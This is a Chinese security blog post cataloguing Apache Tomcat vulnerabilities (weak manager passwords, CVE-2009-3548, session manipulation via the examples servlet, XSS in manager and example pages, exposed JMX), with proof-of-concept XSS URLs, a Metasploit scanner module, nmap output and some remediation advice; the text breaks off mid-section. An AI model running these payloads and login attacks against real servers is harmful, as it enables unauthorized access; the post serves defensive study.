{"title":"Tomcat脆弱性常见漏洞查看验证","slug":"网安大类/Vulnerable/Web/Tomcat脆弱性一览表","date":"2019-09-09T05:30:30.000Z","updated":"2022-10-10T02:29:03.385Z","url":"2019/9-9-418.html","path":"api/articles/2019/9-9-418.html.json","covers":["https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2021/5/20210803145850.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910102416.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910103109.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910103327.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910103341.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910103441.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910103559.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910105316.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910105416.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910105524.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910105608.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910105750.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910105949.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910110120.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910110131.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910110208.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910110310.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910110702.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910110709.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910110750.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910112650.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910112748.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910112810.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910112902.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910112908.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910113002.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910113348.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190911113707.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190911161725.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190916172727.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910112116.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910112126.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910112134.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910112147.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910112208.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910112219.png"],"content":"<p><b style=\"color:red\">注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。</b></p>\n<a id=\"more\"></a>\n<p><strong>本文目录</strong></p>\n<p>[TOC]</p>\n<!-- more -->\n<h2 id=\"0x00-前言简述\"><a href=\"#0x00-前言简述\" class=\"headerlink\" title=\"0x00 前言简述\"></a>0x00 前言简述</h2><p>描述: 项目中会经常遇到Apache Tomcat中间件愈来愈多, 所以作为一个安全运维工作者，在工作中将<code>Apache Tomcat</code>中间件的几大较为重要的高危漏洞做一个总结整理复现。</p>\n<p><strong>Tomcat的高危漏洞列表:</strong></p>\n<ul>\n<li><p>1.Tomcat后台弱口令上传war包</p>\n</li>\n<li><p>2.Tomcat的PUT的上传漏洞<code>(CVE-2017-12615)</code></p>\n</li>\n<li><p>3.Tomcat反序列化漏洞<code>(CVE-2016-8735)</code></p>\n</li>\n<li><p>4.TomcatJMX服务器弱口令</p>\n</li>\n<li><p>5.Tomcat样例目录session操控漏洞</p>\n</li>\n<li><p>6.Tomcat本地提权漏洞<code>(CVE-2016-1240)</code></p>\n</li>\n<li><p>7.Tomcat-win版默认空口令漏洞<code>(CVE-2009-3548)</code></p>\n</li>\n</ul>\n<hr>\n<h2 id=\"0x02-漏洞利用与防御浅析\"><a href=\"#0x02-漏洞利用与防御浅析\" class=\"headerlink\" title=\"0x02 漏洞利用与防御浅析\"></a>0x02 漏洞利用与防御浅析</h2><h3 id=\"1-Tomcat后台弱口令上传war包\"><a href=\"#1-Tomcat后台弱口令上传war包\" class=\"headerlink\" title=\"1.Tomcat后台弱口令上传war包\"></a>1.Tomcat后台弱口令上传war包</h3><p><strong>描述:</strong> 第一个Tomcat后台弱口令上传war包, 在这里我们就是利用暴力破解或者弱口令猜解的方式得到tomcat的后台登陆认证账户，即在登陆成功之时利用<code>tomcat</code>管理控制台<code>WAR file to deploy</code>, 自动部署war的功能将我们的木马进行上传部署。</p>\n<p><strong>授权认证:</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Tomcat 授权认证: 利用Authorization该Header授权字段以base64方式传递账户信息，将账号与密码用冒号进行组合再辅以base64加密所传递。</span></span><br><span class=\"line\">Authorization: Basic V2VpeWlHZWVrOjEyMzQ1Ng==</span><br></pre></td></tr></table></figure></p>\n<p><strong>爆破限制:</strong> 当爆破很多次，发现正确的用户名密码字典爆破出来一直是失败的401状态码。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 在 `conf/server.xml` 中添加一段 `failureCount=\"500\"lockOutTime=\"0\"` 超时锁定数的设置。</span></span><br><span class=\"line\">&lt;Realm className=<span class=\"string\">\"org.apache.catalina.realm.LockOutRealm\"</span> failureCount=<span class=\"string\">\"500\"</span> lockOutTime=<span class=\"string\">\"0\"</span>&gt; &lt;/Realm&gt;</span><br></pre></td></tr></table></figure></p>\n<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2021/5/20210803145850.png\" alt=\"WeiyiGeek.Tomcat\" title=\"\" class=\"\">\n                <p>WeiyiGeek.Tomcat</p>\n            </figure>\n<p><br/></p>\n<p><strong>修复方案:</strong></p>\n<ul>\n<li>1、在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。</li>\n<li>2、增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）, 在<code>CATALINA_HOME/conf/web.xml</code>文件设置锁定机制和时间超时限制。</li>\n<li>3、以及针对<code>manager-gui/manager-status/manager-script</code>等目录页面设置最小权限访问限制。</li>\n</ul>\n<hr>\n<h2 id=\"0x03-漏洞利用与防御浅析\"><a href=\"#0x03-漏洞利用与防御浅析\" class=\"headerlink\" title=\"0x03 漏洞利用与防御浅析\"></a>0x03 漏洞利用与防御浅析</h2><h4 id=\"0x01-Manager-administrator管理页面登录\"><a href=\"#0x01-Manager-administrator管理页面登录\" class=\"headerlink\" title=\"0x01 Manager administrator管理页面登录\"></a>0x01 Manager administrator管理页面登录</h4><p>描述:如果采用的是运行在Windows平台上的Tomcat安装版，并且版本在<code>Tomcat 5.5.0 to 5.5.28</code>或<code>Tomcat 6.0.0 to 6.0.20</code>之间可以利用CVE-2009-3548漏洞来登录后台。<br>漏洞描述:受该漏洞影响的Tomcat版本如果在安装时不更改，那么Tomcat默认会建立一个名为“admin”，密码为空的具有管理权限的账号。<br>漏洞编号:CVE-2009-3548 WIN版默认空口令漏洞</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf</span><br><span class=\"line\">use auxiliary/scanner/http/tomcat_mgr_login”</span><br></pre></td></tr></table></figure>\n<p>脆弱性user.xml配置文件：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">tomcat-users</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">role</span> <span class=\"attr\">rolename</span>=<span class=\"string\">\"manager-gui\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">role</span> <span class=\"attr\">rolename</span>=<span class=\"string\">\"admin-gui\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">user</span> <span class=\"attr\">name</span>=<span class=\"string\">\"admin\"</span> <span class=\"attr\">password</span>=<span class=\"string\">\"admin\"</span> <span class=\"attr\">roles</span>=<span class=\"string\">\"manager-gui,admin-gui\"</span> /&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!--</span></span><br><span class=\"line\"><span class=\"comment\">  <span class=\"doctag\">NOTE:</span>  By default, no user is included in the \"manager-gui\" role required</span></span><br><span class=\"line\"><span class=\"comment\">  to operate the \"/manager/html\" web application.  If you wish to use this app,</span></span><br><span class=\"line\"><span class=\"comment\">  you must define such a user - the username and password are arbitrary.</span></span><br><span class=\"line\"><span class=\"comment\">--&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!--</span></span><br><span class=\"line\"><span class=\"comment\">  <span class=\"doctag\">NOTE:</span>  The sample user and role entries below are wrapped in a comment</span></span><br><span class=\"line\"><span class=\"comment\">  and thus are ignored when reading this file. Do not forget to remove</span></span><br><span class=\"line\"><span class=\"comment\">  &lt;!.. ..&gt; that surrounds them.</span></span><br><span class=\"line\"><span class=\"comment\">--&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!--</span></span><br><span class=\"line\"><span class=\"comment\">  &lt;role rolename=\"tomcat\"/&gt;</span></span><br><span class=\"line\"><span class=\"comment\">  &lt;role rolename=\"role1\"/&gt;</span></span><br><span class=\"line\"><span class=\"comment\">  &lt;user username=\"tomcat\" password=\"tomcat\" roles=\"tomcat\"/&gt;</span></span><br><span class=\"line\"><span class=\"comment\">  &lt;user username=\"both\" password=\"tomcat\" roles=\"tomcat,role1\"/&gt;</span></span><br><span class=\"line\"><span class=\"comment\">  &lt;user username=\"role1\" password=\"tomcat\" roles=\"role1\"/&gt;</span></span><br><span class=\"line\"><span class=\"comment\">--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">tomcat-users</span>&gt;</span></span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910102416.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<h4 id=\"0x02-Tomcat-Manager-XSS漏洞\"><a href=\"#0x02-Tomcat-Manager-XSS漏洞\" class=\"headerlink\" title=\"0x02 Tomcat Manager XSS漏洞\"></a>0x02 Tomcat Manager XSS漏洞</h4><p>漏洞影响:Tomcat 版本包括：7.0.0 - 7.0.4, 6.0.12 - 6.0.29 以及 5.5 的所有版本。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/manager/html/sessions?path=/&amp;sort=<span class=\"string\">\"&gt;&lt;script&gt;alert('xss')&lt;/script&gt;order=ASC&amp;action=injectSessions&amp;refresh=Refresh+Sessions+list</span></span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<h4 id=\"0x03-Tomcat样例目录session操纵漏洞\"><a href=\"#0x03-Tomcat样例目录session操纵漏洞\" class=\"headerlink\" title=\"0x03 Tomcat样例目录session操纵漏洞\"></a>0x03 Tomcat样例目录session操纵漏洞</h4><p>描述：Apache Tomcat默认安装包含”/examples”目录里面存着众多的样例，其中session样例(/examples/servlets/servlet/SessionExample)允许用户对session进行操纵。<br>因为session是全局通用的所以用户可以通过操纵session获取管理员权限,注意cookies与session是不同的前者是存储再浏览器本地,而session存储在服务端;</p>\n<p>0x01 漏洞分析演示<br>首先，我们先来看看SessionExample的部分源码<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//表单代码</span></span><br><span class=\"line\">out.println(<span class=\"string\">\"&lt;P&gt;\"</span>);</span><br><span class=\"line\">out.print(<span class=\"string\">\"&lt;form action=\\\"\"</span>);</span><br><span class=\"line\">out.print(response.encodeURL(<span class=\"string\">\"SessionExample\"</span>));</span><br><span class=\"line\">out.print(<span class=\"string\">\"\\\" \"</span>);</span><br><span class=\"line\">out.println(<span class=\"string\">\"method=POST&gt;\"</span>);</span><br><span class=\"line\">out.println(rb.getString(<span class=\"string\">\"sessions.dataname\"</span>));</span><br><span class=\"line\">out.println(<span class=\"string\">\"&lt;input type=text size=20 name=dataname&gt;\"</span>);</span><br><span class=\"line\">out.println(<span class=\"string\">\"&lt;br&gt;\"</span>);</span><br><span class=\"line\">out.println(rb.getString(<span class=\"string\">\"sessions.datavalue\"</span>));</span><br><span class=\"line\">out.println(<span class=\"string\">\"&lt;input type=text size=20 name=datavalue&gt;\"</span>);</span><br><span class=\"line\">out.println(<span class=\"string\">\"&lt;br&gt;\"</span>);</span><br><span class=\"line\">out.println(<span class=\"string\">\"&lt;input type=submit&gt;\"</span>);</span><br><span class=\"line\">out.println(<span class=\"string\">\"&lt;/form&gt;\"</span>);</span><br><span class=\"line\"> <span class=\"comment\">//核心代码</span></span><br><span class=\"line\">       HttpSession session = request.getSession(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">       out.println(rb.getString(<span class=\"string\">\"sessions.id\"</span>) + <span class=\"string\">\" \"</span> +session.getId());</span><br><span class=\"line\">       out.println(<span class=\"string\">\"&lt;br&gt;\"</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">       out.println(rb.getString(<span class=\"string\">\"sessions.created\"</span>) + <span class=\"string\">\" \"</span>);</span><br><span class=\"line\">       out.println(<span class=\"keyword\">new</span> Date(session.getCreationTime()) +<span class=\"string\">\"&lt;br&gt;\"</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">       out.println(rb.getString(<span class=\"string\">\"sessions.lastaccessed\"</span>) + <span class=\"string\">\"\"</span>);</span><br><span class=\"line\">       out.println(<span class=\"keyword\">new</span> Date(session.getLastAccessedTime()));</span><br><span class=\"line\">    </span><br><span class=\"line\">       String dataName = request.getParameter(<span class=\"string\">\"dataname\"</span>);<span class=\"comment\">//获取dataname参数的值</span></span><br><span class=\"line\">       String dataValue = request.getParameter(<span class=\"string\">\"datavalue\"</span>);<span class=\"comment\">//获取datavalue参数的值</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (dataName != <span class=\"keyword\">null</span> &amp;&amp; dataValue != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">           session.setAttribute(dataName, dataValue);<span class=\"comment\">//将dataname和datavalue写入session</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>用户通过表单提交dataname和datavalue参数，然后通过request.getParameter（）函数获取这两个参数的值，再通过session.setAttribute()函数将dataname和datavalue的值写入session；</p>\n<p>举个例子：我们先来编写login.jsp,login2.jsp,index.jsp这三个页面，通过这三个页面来模拟一般网站身份验证的过程。<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//login.jsp</span></span><br><span class=\"line\">&lt;formaction=login2.jsp method=<span class=\"string\">\"POST\"</span> &gt;  </span><br><span class=\"line\">  用户名: &lt;input type=<span class=\"string\">\"text\"</span>name=<span class=\"string\">\"username\"</span>&gt;&lt;br&gt; </span><br><span class=\"line\">  密码: &lt;input type=<span class=\"string\">\"text\"</span> name=<span class=\"string\">\"password\"</span>&gt;&lt;br&gt; </span><br><span class=\"line\">  &lt;inputtype=<span class=\"string\">\"submit\"</span> value=<span class=\"string\">\"登录\"</span>&gt;&lt;br&gt; </span><br><span class=\"line\">&lt;form&gt;</span><br></pre></td></tr></table></figure></p>\n<p>login2.jsp<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;% </span><br><span class=\"line\"> <span class=\"keyword\">if</span>(request.getParameter(<span class=\"string\">\"username\"</span>) != <span class=\"keyword\">null</span> &amp;&amp; request.getParameter(<span class=\"string\">\"password\"</span>)!= <span class=\"keyword\">null</span>) &#123;  </span><br><span class=\"line\">      String username =request.getParameter(<span class=\"string\">\"username\"</span>); </span><br><span class=\"line\">      String password =request.getParameter(<span class=\"string\">\"password\"</span>); </span><br><span class=\"line\">      <span class=\"comment\">//验证身份 </span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (username.equals(<span class=\"string\">\"admin\"</span>)&amp;&amp; password.equals(<span class=\"string\">\"admin\"</span>)) &#123;  </span><br><span class=\"line\">        session.setAttribute(<span class=\"string\">\"login\"</span>,<span class=\"string\">\"admin\"</span>); </span><br><span class=\"line\">        response.sendRedirect(<span class=\"string\">\"index.jsp\"</span>); </span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span> &#123; </span><br><span class=\"line\">           response.sendRedirect(<span class=\"string\">\"login.jsp\"</span>);  </span><br><span class=\"line\">        &#125;     </span><br><span class=\"line\">&#125; </span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure></p>\n<p>index.jsp :意思就是当login的session为admin时候为登录否则跳转到login.jsp<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;% </span><br><span class=\"line\"><span class=\"comment\">//判断session</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(session.getAttribute(<span class=\"string\">\"login\"</span>) != <span class=\"keyword\">null</span> &amp;&amp; ((String)session.getAttribute(<span class=\"string\">\"login\"</span>)).equals(<span class=\"string\">\"admin\"</span>))&#123; </span><br><span class=\"line\">        out.println(<span class=\"string\">\"Login\"</span>); </span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">       response.sendRedirect(<span class=\"string\">\"login.jsp\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure></p>\n<p><em>演示如何通过操纵session进入网站后台</em></p>\n<p>(1)我们直接打开网站后台即index.jsp,发现被重定向到login.jsp了，而且在不知道密码的前提下，我们是无法登陆进去的<br><a href=\"http://127.0.0.1:8080/examples/index.jsp\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/examples/index.jsp</a><br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910103109.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>(2)打开SessionExample : <code>http://127.0.0.1:8080/examples/servlets/servlet/SessionExample</code><br>在Name of Session Attribute: 里输入login<br>在Value of Session Attribute:里输入admin<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910103327.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>(3)提交后显示login=admin已经写入session<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910103341.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>再次打开index.jsp，显示成功登录<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%setAttribute(<span class=\"string\">\"request.getParameter(\"</span>u<span class=\"string\">\")\"</span>, <span class=\"string\">\" request.getParameter(\"</span>a<span class=\"string\">\")%&gt;</span></span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910103441.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p><br></p>\n<h4 id=\"0x04-Tomcat样例目录XXS漏洞\"><a href=\"#0x04-Tomcat样例目录XXS漏洞\" class=\"headerlink\" title=\"0x04 Tomcat样例目录XXS漏洞\"></a>0x04 Tomcat样例目录XXS漏洞</h4><p>描述：Apache Software Foundation Tomcat跨站脚本攻击漏洞<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.cq.cn:8080/jsp-examples/jsp2/el/functions.jsp?foo=[XSSplayload]</span><br><span class=\"line\">http://www.cq.cn:8080/jsp-examples/jsp2/el/implicit-objects.jsp?foo=[XSSplayload]</span><br><span class=\"line\">http://www.cq.cn:8080/jsp-examples/cal/cal2.jsp?time=[XSSplayload]</span><br><span class=\"line\">http://host:port/jsp-examples/snp/snoop.jsp; &lt;SCRIPT&gt;alert()&lt;/SCRIPT&gt; test.jsp</span><br></pre></td></tr></table></figure></p>\n<p><em>XSS POC:</em><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img/src=<span class=\"string\">\"http://www.cqczkj.gov.cn/images/flink1.png\"</span>&gt;</span><br><span class=\"line\">&lt;a href=<span class=\"string\">\"#\"</span> alt=<span class=\"string\">\"baidu\"</span> onclick=alert(window.location.host)&gt;<span class=\"built_in\">test</span>&lt;/a&gt;</span><br><span class=\"line\">&lt;input <span class=\"built_in\">type</span>=<span class=\"string\">\"button\"</span> value=<span class=\"string\">\"xss\"</span> onclick=<span class=\"string\">\"alert(1)\"</span>/&gt;</span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910103559.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<h4 id=\"0x05-Tomcat-JMX服务器弱口令\"><a href=\"#0x05-Tomcat-JMX服务器弱口令\" class=\"headerlink\" title=\"0x05 Tomcat JMX服务器弱口令\"></a>0x05 Tomcat JMX服务器弱口令</h4><p>Tomcat服务器的一些配置问题，可以将Java管理扩展（JMX）服务暴露到外部网络中，来用于远程监视和管理的目的。<br>通过使用Java开发工具包（JDK）中的JConsole工具，这些功能可能被攻击者滥用来获得系统的控制权限。</p>\n<p>实例:通过Java远程方法调用（RMI）来与服务器交互。这个服务默认不开启，与之相反的是其他常见的<code>Java企业版的服务器（比如JBoss）是默认配置开启的</code>。<br>为了开启Tomcat的JMX服务，需要在setenv.sh/setenv.bat做一些简单的修改，这个脚本是用来设置环境变量和Catalina进程启动时的一些属性。<br>JMX服务可以配置为支持认证，但是它默认不开启，当认证被开启（总是被推荐），它的授权模型允许访问属于只读或读写角色的两个不同的用户。</p>\n<p>例如，在下面的URL对应的网页的标题为“监视和管理Tomcat”，但是它的配置指导是基于java 6版本的：<br><a href=\"http://tomcat.apache.org/tomcat-8.0-doc/monitoring.html#Enabling_JMX_Remote\" target=\"_blank\" rel=\"noopener\">http://tomcat.apache.org/tomcat-8.0-doc/monitoring.html#Enabling_JMX_Remote</a><br>为了开启Tomcat的JMX服务，需要在setenv.sh/setenv.bat做一些简单的修改，这个脚本是用来设置环境变量和Catalina进程启动时的一些属性。</p>\n<ul>\n<li>编辑Tomcat/bin中的catalina.bat。如果配置权限，需要将autenticate设置为true，将1中的下面两行代码添加到最上面一行，注意所有的命令必须在一行！</li>\n<li>在Tomcat/conf目录下新建两个文件：jmxremote.access和jmxremote.password,第一个文件存的是角色信息，第二个存放的是密码信息（可修改）。</li>\n</ul>\n<p>如果你需要认证，添加并修改这个：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-Dcom.sun.management.jmxremote.authenticate=<span class=\"literal\">true</span></span><br><span class=\"line\">-Dcom.sun.management.jmxremote.password.file=../conf/jmxremote.password</span><br><span class=\"line\">-Dcom.sun.management.jmxremote.access.file=../conf/jmxremote.access</span><br></pre></td></tr></table></figure></p>\n<p>编辑$CATALINA_BASE/conf/jmxremote.access文件：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">monitorRole <span class=\"built_in\">readonly</span> <span class=\"comment\">#权限</span></span><br><span class=\"line\">controlRole readwrite</span><br></pre></td></tr></table></figure></p>\n<p>编辑$CATALINA_BASE/conf/jmxremote.password文件：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">onitorRole tomcat     <span class=\"comment\">#角色分配密码</span></span><br><span class=\"line\">controlRole tomcat</span><br></pre></td></tr></table></figure><br>提示：密码文件应该是只读的，只能用和运行Tomcat相同的操作系统用户来访问。<br>如上所见，jmxremote.access文件包含两个用户名（monitorRole和controlRole）和他们相关的角色。在jmxremote.password文件中设置这些用户的密码。</p>\n<p><br></p>\n<p>(1)验证是否启用Tomcat的JMX接口<br>通常需要使用nmap进行扫描，来确认与Tomcat关联的JMX接口是否已启动并在远程服务器上运行。</p>\n<blockquote>\n<p>nmap -p- -A -sV –version-all 192.168.11.128<br>…<br>2001/tcp open java-rmi Java RMI Registry<br>| rmi-dumpregistry:<br>| jmxrmi<br>| implements javax.management.remote.rmi.RMIServer,<br>| extends<br>| java.lang.reflect.Proxy<br>| fields<br>| Ljava/lang/reflect/InvocationHandler; h<br>| java.rmi.server.RemoteObjectInvocationHandler<br>| @192.168.11.128:2001<br>| extends<br>|_ java.rmi.server.RemoteObject<br>…<br>8009/tcp open ajp13 Apache Jserv (Protocol v1.3)<br>8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1<br>49222/tcp open rmiregistry Java RMI</p>\n</blockquote>\n<p>在这种情况下JMX服务被配置为<code>在非标准端口2001/tcp而不是端口1099/tcp上运行</code>，1099/tcp通常被这种服务的优先选择。<br><br></p>\n<p>(2)使用Jconsole连接jxm工具<br>如果你使用Windows，JConsole是JDK中的一个小的可执行文件，存储在bin文件夹中（Kail中也有）。</p>\n<blockquote>\n<p>jconsole 命令</p>\n</blockquote>\n<figure class=\"image-box\">\n                <img 